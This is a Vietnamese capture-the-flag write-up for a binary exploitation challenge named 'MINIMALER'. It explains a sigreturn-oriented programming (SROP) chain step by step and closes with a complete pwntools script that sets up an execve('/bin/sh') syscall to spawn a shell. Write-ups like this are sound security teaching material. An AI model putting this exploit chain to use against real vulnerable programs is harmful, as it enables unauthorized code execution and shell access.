# MINIMALER
## Khai thác
### Lần nhập 1
- Bài này SROP và hơi lạ một xíu và cần debug kĩ
- Đầu tiên ta sẽ loop hàm main
```python
payload=b"A"*8
payload+=flat(
    0x404020+8,
    0x401142,
)
p.sendline(payload)
```
- `0x404020+8` đây là ow rbp, lí do ta sẽ ghi vào vùng có quyền `read-write` để khi loop hàm main 
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/4a8042db-3511-4811-9ea9-17ee76566d8c)

### Lần nhập 2
```python
frame=SigreturnFrame()
frame.rax=0x3b
frame.rdi=0x404000
frame.rsi=0
frame.rdx=0
frame.rip=exe.plt['syscall']
frame.rsp=exe.plt['syscall']
payload=flat(
    exe.plt['syscall'],0x404008,
    0x401142,
    bytes(frame)[0x10::]
)
input("ENTER TO SEND PAYLOAD 2")
p.send(payload)
```
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/779e786b-ba79-49a7-935a-d24d9569595a)
- Ta sẽ ghi frame vào `0x4040420`

### Lần nhập 3
```python
payload=flat(
    b"/bin/sh\x00",
    0x404a00+8,
    ret,
    b"\x3b"
)
input("enter to send syscall")
p.send(payload)
```
- Set up các thanh ghi (do là nó bị dời một xíu nên lần 2 bỏ 0x10 byte đầu)

## Lần nhập 4
```python
input('send 0xf bytes')
sh=b"/bin/sh\x00"
sh=sh.ljust(0xf,b"A")
p.send(sh)
```
## Script
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('a_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+49

                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)
base = 0x0000000000404500
GDB()
ret=0x000000000040101a
rw_section=0x404a00
payload=b"A"*8
payload+=flat(
    0x404020+8,
    0x401142,
)
p.sendline(payload)

frame=SigreturnFrame()
frame.rax=0x3b
frame.rdi=0x404000
frame.rsi=0
frame.rdx=0
frame.rip=exe.plt['syscall']
frame.rsp=exe.plt['syscall']
payload=flat(
    exe.plt['syscall'],0x404008,
    0x401142,
    bytes(frame)[0x10::]
)
input("ENTER TO SEND PAYLOAD 2")
p.send(payload)

payload=flat(
    b"/bin/sh\x00",    # 0x404000
    0x404a00+8,
    ret,
    b"\x3b"
)
input("enter to send syscall")
p.send(payload)
input('send 0xf bytes')
sh=b"/bin/sh\x00"
sh=sh.ljust(0xf,b"A")
p.send(sh)

p.interactive()
p.interactive()
```
